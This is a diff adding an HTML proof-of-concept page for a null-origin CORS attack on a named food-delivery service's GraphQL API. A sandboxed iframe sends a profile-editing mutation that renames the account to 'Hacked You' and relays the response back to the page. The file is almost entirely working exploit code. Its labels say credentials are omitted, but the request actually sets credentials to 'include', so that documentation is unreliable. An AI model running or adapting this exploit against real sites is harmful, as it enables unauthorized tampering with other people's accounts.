@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Null-origin CORS PoC (GraphQL POST, no cookies)</title></head>
+<body>
+<h3>Null-origin CORS PoC (GraphQL POST, <code>credentials: "omit"</code>)</h3>
+
+<iframe id="atk" sandbox="allow-scripts" srcdoc='
+  <!doctype html>
+  <meta charset="utf-8">
+  <script>
+    (async () => {
+      const url = "https://www.doordash.com/graphql/editConsumerProfileInformation?operation=editConsumerProfileInformation";
+
+      // Adjust fields as needed for your test payload:
+      const graphqlPayload = {
+        operationName: "editConsumerProfileInformation",
+        variables: { firstName: "Hacked", lastName: "You" },
+        query: "mutation editConsumerProfileInformation($firstName: String, $lastName: String, $email: String, $phoneNumber: String, $defaultCountry: String) { updateConsumerProfileInformation(firstName: $firstName lastName: $lastName email: $email phoneNumber: $phoneNumber defaultCountry: $defaultCountry) { id firstName lastName email phoneNumber phoneNumberComponents { formattedNationalNumber nationalNumber formattedInternationalNumber countryCode internationalNumber countryShortname __typename } defaultCountry __typename }}"
+      };
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          mode: "cors",
+          credentials: "include",       // <— no cookies/credentials
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(graphqlPayload)
+        });
+
+        // Try JSON first; fall back to text for non-JSON/error pages
+        let bodyText = "";
+        try {
+          const data = await res.json();
+          bodyText = JSON.stringify(data);
+        } catch {
+          bodyText = await res.text();
+        }
+
+        // Send a compact result back to parent
+        parent.postMessage({
+          ok: res.ok,
+          status: res.status,
+          statusText: res.statusText,
+          headers: Array.from(res.headers.entries()),
+          bodyPreview: bodyText.slice(0, 1200)
+        }, "*");
+      } catch (e) {
+        parent.postMessage({ error: String(e) }, "*");
+      }
+    })();
+  </script>
+'></iframe>
+
+<pre id="out" style="white-space:pre-wrap"></pre>
+
+<script>
+  window.addEventListener("message", (e) => {
+    document.getElementById("out").textContent = JSON.stringify(e.data, null, 2);
+  }, false);
+</script>
+</body>
+</html>
+
